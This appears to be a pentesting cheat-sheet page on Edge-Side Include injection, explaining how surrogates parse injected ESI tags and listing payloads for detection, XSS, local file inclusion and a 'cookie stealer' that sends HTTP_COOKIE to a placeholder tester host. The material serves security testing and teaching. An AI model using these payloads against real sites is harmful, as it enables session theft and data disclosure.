---
description: >-
  Edge Side Includes (ESI) is an XML-based markup language used to tackle
  performance issues by enabling heavy caching of Web content.
---

# Edge-Side Includes (ESI)

Edge-Side Include Injection occurs when an attacker manages to reflect malicious ESI tags in the HTTP Response. The root cause of this vulnerability is that HTTP surrogates cannot validate the ESI tag origin. They will gladly parse and evaluate legitimate ESI tags by the upstream server and malicious ESI tags by an attacker.

Although we can identify the use of ESI by inspecting response headers in search for `Surrogate-Control: content="ESI/1.0"`, we usually need to use a blind attack approach to detect if ESI is in use or not. Specifically, we can introduce ESI tags to HTTP requests to see if any intermediary proxy is parsing the request and if ESI Injection is possible. Some useful ESI tags are:

### ESI Tags:

```html
// Basic detection
<esi: include src=http://<PENTESTER IP>>

// XSS Exploitation Example
<esi: include src=http://<PENTESTER IP>/<XSSPAYLOAD.html>>

// Cookie Stealer (bypass httpOnly flag)
<esi: include src=http://<PENTESTER IP>/?cookie_stealer.php?=$(HTTP_COOKIE)>

// Introduce private local files (Not LFI per se)
<esi:include src="supersecret.txt">

// Valid for Akamai, sends debug information in the response
<esi:debug/>
```



_**Here is a table of possible software that may be vulnerable to ESI.**_

<figure><img src="../../.gitbook/assets/Screenshot 2023-08-21 131257.png" alt=""><figcaption></figcaption></figure>
